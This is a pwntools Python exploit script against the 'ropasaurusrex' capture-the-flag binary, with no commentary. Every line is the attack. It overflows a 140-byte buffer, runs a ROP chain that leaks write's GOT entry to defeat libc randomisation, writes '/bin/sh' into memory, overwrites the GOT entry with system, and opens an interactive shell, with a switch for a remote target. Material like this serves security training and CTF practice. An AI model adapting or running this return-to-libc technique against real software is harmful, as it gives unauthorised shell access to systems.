from pwn import *

context(os='linux',arch='i386')
#context.log_level='debug'

host='localhost'
port=1025
conn=None

if len(sys.argv)>1 and sys.argv[1]=="r":
    conn=remote(host,port)
else:
    conn=process('./ropasaurusrex')

elf=ELF('./ropasaurusrex')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')

write_plt=0x804830c
write_got=0x8049614
offset_write=0xe6d80

read_plt=0x804832c

pop3ret=0x80484b6

offset_system=0x3d200
offset_sh=0x17e0cf

data=0x8049620


#stage1

payload=p8(0x41)*140

payload+=p32(elf.symbols['write'])
payload+=p32(pop3ret)
payload+=p32(1)
payload+=p32(elf.got['write'])
payload+=p32(4)


payload+=p32(elf.symbols['read'])
payload+=p32(pop3ret)
payload+=p32(0)
payload+=p32(data)
payload+=p32(10)

payload+=p32(elf.symbols['read'])
payload+=p32(pop3ret)
payload+=p32(0)
payload+=p32(elf.got['write'])
payload+=p32(4)

payload+=p32(elf.symbols['write'])
payload+=p32(0xdeadbeef)
payload+=p32(data)


conn.send(payload)
res=conn.recv(4)

libc_base=u32(res)-libc.symbols['write']

payload='/bin/sh\0'
conn.sendline(payload)

payload=p32(libc_base+libc.symbols['system'])
conn.sendline(payload)

conn.interactive()

